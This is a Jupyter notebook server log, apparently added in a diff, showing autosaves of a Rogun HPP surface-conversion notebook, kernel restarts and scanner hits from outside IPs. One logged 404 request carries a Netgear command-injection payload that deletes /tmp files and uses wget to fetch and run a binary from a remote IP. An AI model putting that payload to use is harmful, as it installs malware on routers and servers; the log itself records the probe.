+[I 11:48:36.427 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 11:50:30.467 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 11:52:09.694 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 11:52:30.456 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[W 11:53:08.965 NotebookApp] 405 HEAD / (137.116.82.109) 0.52ms referer=None
+[I 11:54:30.465 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 11:56:30.520 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 11:58:30.418 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 11:58:38.708 NotebookApp] 302 GET / (79.106.44.50) 0.53ms
+[I 12:00:30.576 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 12:02:31.036 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 12:08:30.941 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 12:14:30.567 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 12:14:40.633 NotebookApp] 302 GET / (41.221.36.46) 0.60ms
+[I 12:16:30.410 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 12:18:30.860 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 12:20:30.389 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 12:22:30.424 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 12:23:18.917 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 12:24:30.784 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 12:26:30.376 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 12:26:44.617 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 12:28:02.390 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 12:29:41.687 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 12:30:30.400 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 12:32:30.384 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 12:34:30.953 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 12:36:30.800 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 12:38:30.913 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 12:40:30.508 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 12:42:30.397 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 12:44:30.534 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 12:45:06.007 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 12:46:03.540 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 12:46:30.453 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 12:48:30.380 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 12:50:30.402 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 14:18:30.550 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 14:19:35.103 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 14:20:10.707 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 14:22:30.555 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 14:24:30.574 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 14:26:30.540 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 14:27:02.402 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 14:30:30.541 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 14:32:30.947 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 14:36:30.532 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 14:38:30.555 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 14:40:30.539 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 14:42:30.574 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 14:43:11.984 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 14:44:22.914 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 14:50:30.525 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 14:52:30.542 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 14:54:30.694 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 14:54:31.688 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 14:55:23.113 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[W 14:57:10.698 NotebookApp] WebSocket ping timeout after 119917 ms.
+[W 14:57:11.705 NotebookApp] WebSocket ping timeout after 119977 ms.
+[W 14:57:17.700 NotebookApp] WebSocket ping timeout after 119918 ms.
+[W 14:57:27.674 NotebookApp] WebSocket ping timeout after 119974 ms.
+[W 14:57:29.702 NotebookApp] WebSocket ping timeout after 119913 ms.
+[W 14:57:29.768 NotebookApp] WebSocket ping timeout after 119977 ms.
+[W 14:57:30.668 NotebookApp] WebSocket ping timeout after 119976 ms.
+[I 15:12:56.294 NotebookApp] 302 GET / (201.0.112.167) 0.51ms
+[I 15:26:43.733 NotebookApp] 302 GET / (78.171.210.235) 0.64ms
+[I 15:54:11.722 NotebookApp] 302 GET / (103.116.86.111) 0.48ms
+[I 16:59:40.655 NotebookApp] Adapting to protocol v5.1 for kernel 992e6179-0a4d-43b1-96b8-1eb0c98e2477
+[I 16:59:50.648 NotebookApp] Adapting to protocol v5.1 for kernel b7373cfa-4c01-487f-b4cd-47e63f6e5250
+[I 16:59:52.633 NotebookApp] Adapting to protocol v5.1 for kernel 00391099-ca73-4d6f-8d34-b9ba0546ef22
+[I 16:59:52.705 NotebookApp] Adapting to protocol v5.1 for kernel 54685d48-a53d-49b7-8843-cccd61a96866
+[I 16:59:53.618 NotebookApp] Adapting to protocol v5.1 for kernel 7d707769-7fa0-4016-bca7-ebbd158e52ed
+[I 17:05:22.326 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 17:05:51.860 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 17:07:22.297 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 17:07:37.271 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 17:07:59.324 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 17:08:21.222 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 17:08:28.642 NotebookApp] Adapting to protocol v5.1 for kernel 659633e3-4083-4a34-9427-48700676a17b
+[I 17:08:31.653 NotebookApp] Adapting to protocol v5.1 for kernel 00391099-ca73-4d6f-8d34-b9ba0546ef22
+[I 17:09:22.312 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 17:13:22.302 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 17:15:22.292 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 17:15:56.211 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 17:16:34.258 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 17:17:22.563 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 17:18:40.125 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 17:19:18.386 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 17:19:22.242 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 17:21:22.298 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 17:21:57.865 NotebookApp] 302 GET / (187.10.196.70) 0.49ms
+[I 17:21:57.946 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 17:35:07.302 NotebookApp] 302 GET / (190.109.211.202) 0.63ms
+[I 18:05:53.753 NotebookApp] 302 GET / (46.12.125.37) 0.56ms
+[W 18:36:22.972 NotebookApp] 404 GET /manager/html (60.191.66.218) 1.87ms referer=None
+[W 18:46:01.654 NotebookApp] WebSocket ping timeout after 119898 ms.
+[W 18:46:10.656 NotebookApp] WebSocket ping timeout after 119887 ms.
+[W 18:46:20.649 NotebookApp] WebSocket ping timeout after 119971 ms.
+[W 18:46:22.634 NotebookApp] WebSocket ping timeout after 119782 ms.
+[W 18:46:22.706 NotebookApp] WebSocket ping timeout after 119853 ms.
+[W 18:46:23.619 NotebookApp] WebSocket ping timeout after 119948 ms.
+[W 18:46:28.643 NotebookApp] WebSocket ping timeout after 119966 ms.
+[I 19:00:10.263 NotebookApp] 302 GET / (66.207.82.47) 0.61ms
+[I 19:08:09.212 NotebookApp] 302 GET / (201.68.129.236) 0.51ms
+[I 19:56:57.586 NotebookApp] 302 GET / (191.193.100.137) 0.65ms
+[I 21:07:41.477 NotebookApp] 302 GET / (190.219.18.48) 0.53ms
+[I 23:13:18.872 NotebookApp] 302 GET / (79.166.222.108) 0.56ms
+[I 23:50:09.224 NotebookApp] 302 GET / (177.220.188.120) 0.55ms
+[I 00:10:06.430 NotebookApp] 302 GET / (184.105.139.70) 0.49ms
+[I 01:10:44.835 NotebookApp] 302 GET / (209.17.97.66) 0.59ms
+[I 02:29:38.095 NotebookApp] 302 GET / (197.234.80.239) 0.63ms
+[I 03:21:01.246 NotebookApp] 302 GET / (173.224.104.170) 0.63ms
+[I 04:04:06.508 NotebookApp] Adapting to protocol v5.1 for kernel 00391099-ca73-4d6f-8d34-b9ba0546ef22
+[I 04:04:15.445 NotebookApp] Adapting to protocol v5.1 for kernel 992e6179-0a4d-43b1-96b8-1eb0c98e2477
+[I 04:04:25.475 NotebookApp] Adapting to protocol v5.1 for kernel b7373cfa-4c01-487f-b4cd-47e63f6e5250
+[I 04:04:27.490 NotebookApp] Adapting to protocol v5.1 for kernel 00391099-ca73-4d6f-8d34-b9ba0546ef22
+[I 04:04:27.565 NotebookApp] Adapting to protocol v5.1 for kernel 54685d48-a53d-49b7-8843-cccd61a96866
+[I 04:04:28.472 NotebookApp] Adapting to protocol v5.1 for kernel 7d707769-7fa0-4016-bca7-ebbd158e52ed
+[I 04:04:33.447 NotebookApp] Adapting to protocol v5.1 for kernel 659633e3-4083-4a34-9427-48700676a17b
+[I 04:51:17.324 NotebookApp] 302 GET / (34.214.250.209) 0.51ms
+[I 04:51:17.486 NotebookApp] 302 GET /tree? (34.214.250.209) 0.91ms
+[I 05:00:40.140 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 05:02:08.402 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 05:07:54.093 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 05:08:40.120 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 05:10:16.974 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 05:10:40.071 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 05:12:40.073 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 05:14:40.078 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 05:16:40.071 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 05:17:13.551 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 05:18:40.090 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 05:20:40.078 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 05:21:21.773 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 05:22:40.088 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 05:23:05.746 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 05:23:51.288 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 05:24:03.388 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 05:26:40.059 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 05:28:40.083 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 05:29:19.863 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 05:30:40.072 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 05:32:40.072 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 05:34:40.074 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 05:36:36.173 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 05:36:40.010 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 05:38:40.074 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 05:39:35.862 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 05:40:40.085 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 05:42:40.054 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 05:43:09.317 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 05:44:40.065 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 05:46:40.063 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 05:47:20.547 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 05:47:45.201 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 05:48:40.057 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 05:50:06.720 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 05:52:07.863 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 05:52:40.079 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 05:54:40.048 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 05:55:47.070 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 05:56:40.041 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 05:57:37.758 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 05:58:40.066 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 06:00:40.097 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 06:01:56.042 NotebookApp] Kernel restarted: b7373cfa-4c01-487f-b4cd-47e63f6e5250
+[I 06:01:56.962 NotebookApp] Adapting to protocol v5.1 for kernel b7373cfa-4c01-487f-b4cd-47e63f6e5250
+[I 06:02:40.044 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 06:04:40.041 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 06:06:05.123 NotebookApp] 302 GET / (149.248.9.19) 0.56ms
+[I 06:06:05.271 NotebookApp] 302 GET /tree? (149.248.9.19) 0.82ms
+[I 06:06:40.087 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 06:07:18.604 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 06:08:02.697 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 06:08:20.019 NotebookApp] Kernel restarted: b7373cfa-4c01-487f-b4cd-47e63f6e5250
+[I 06:08:20.820 NotebookApp] Adapting to protocol v5.1 for kernel b7373cfa-4c01-487f-b4cd-47e63f6e5250
+[I 06:08:38.492 NotebookApp] 302 GET / (196.52.43.125) 0.67ms
+[I 06:08:39.933 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 06:10:28.603 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 06:10:37.413 NotebookApp] Kernel restarted: b7373cfa-4c01-487f-b4cd-47e63f6e5250
+[I 06:10:38.124 NotebookApp] Adapting to protocol v5.1 for kernel b7373cfa-4c01-487f-b4cd-47e63f6e5250
+[I 06:10:39.186 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 06:12:40.071 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 06:24:40.034 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 06:26:22.401 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 06:26:40.050 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 06:28:13.272 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 06:28:35.890 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 06:30:40.033 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 06:31:17.557 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 06:31:22.209 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 06:31:36.801 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[W 06:31:43.192 NotebookApp] 404 GET /nbextensions/widgets/notebook/js/extension.js?v=20181014113501 (80.254.184.33) 3.87ms referer=http://gis.jkaelin.com:8080/notebooks/data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 06:31:45.261 NotebookApp] Adapting to protocol v5.1 for kernel b7373cfa-4c01-487f-b4cd-47e63f6e5250
+[I 06:31:58.566 NotebookApp] Kernel restarted: b7373cfa-4c01-487f-b4cd-47e63f6e5250
+[I 06:31:59.466 NotebookApp] Adapting to protocol v5.1 for kernel b7373cfa-4c01-487f-b4cd-47e63f6e5250
+[I 06:33:39.325 NotebookApp] 302 GET / (123.255.251.62) 0.71ms
+[I 06:33:46.217 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 06:34:03.921 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 06:34:16.376 NotebookApp] Kernel restarted: b7373cfa-4c01-487f-b4cd-47e63f6e5250
+[I 06:34:17.081 NotebookApp] Adapting to protocol v5.1 for kernel b7373cfa-4c01-487f-b4cd-47e63f6e5250
+[I 06:35:46.222 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 06:36:30.898 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 06:37:06.622 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 06:39:46.213 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 06:43:46.199 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 06:45:46.193 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 06:47:46.180 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 06:49:46.168 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 06:51:46.201 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 06:53:46.202 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 06:54:46.307 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 06:55:46.182 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 06:57:46.198 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 06:57:52.765 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 06:58:10.918 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 06:59:46.193 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 07:01:46.188 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 07:02:21.987 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 07:03:46.199 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 07:04:26.903 NotebookApp] 302 GET / (185.141.61.16) 0.58ms
+[I 07:04:26.989 NotebookApp] 302 GET /tree (185.141.61.16) 0.84ms
+[I 07:05:46.187 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 07:06:49.551 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 07:07:46.183 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 07:09:05.977 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 07:09:46.186 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 07:11:46.187 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 07:13:23.761 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 07:13:46.512 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 07:30:22.761 NotebookApp] 302 GET / (60.191.38.77) 0.44ms
+[I 07:30:23.511 NotebookApp] 302 GET /tree? (60.191.38.77) 0.80ms
+[I 07:40:29.311 NotebookApp] 302 GET / (139.162.111.98) 0.50ms
+[I 08:09:38.156 NotebookApp] 302 GET / (85.91.98.30) 0.52ms
+[W 08:44:03.937 NotebookApp] 404 GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://68.183.28.29/cock+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 (119.23.210.117) 1.74ms referer=None
+[I 10:05:46.090 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 10:07:28.671 NotebookApp] 302 GET / (187.116.98.226) 0.58ms
+[I 10:07:46.279 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 11:48:30.980 NotebookApp] 302 GET / (99.35.193.3) 0.49ms
+[I 12:28:47.547 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 12:29:04.974 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 12:29:45.977 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 12:31:45.977 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 12:33:24.122 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 12:33:45.966 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 12:35:45.971 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 12:37:32.395 NotebookApp] Kernel restarted: b7373cfa-4c01-487f-b4cd-47e63f6e5250
+[I 12:37:33.313 NotebookApp] Adapting to protocol v5.1 for kernel b7373cfa-4c01-487f-b4cd-47e63f6e5250
+[I 12:37:45.790 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 12:39:46.723 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 12:40:44.607 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 12:41:46.124 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 12:51:46.120 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 12:52:41.799 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 12:53:35.177 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 12:53:36.548 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 12:53:46.362 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 12:55:29.464 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 12:59:46.913 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 13:01:16.540 NotebookApp] 302 GET / (187.11.77.120) 0.56ms
+[I 13:09:03.748 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 13:09:07.233 NotebookApp] Kernel restarted: b7373cfa-4c01-487f-b4cd-47e63f6e5250
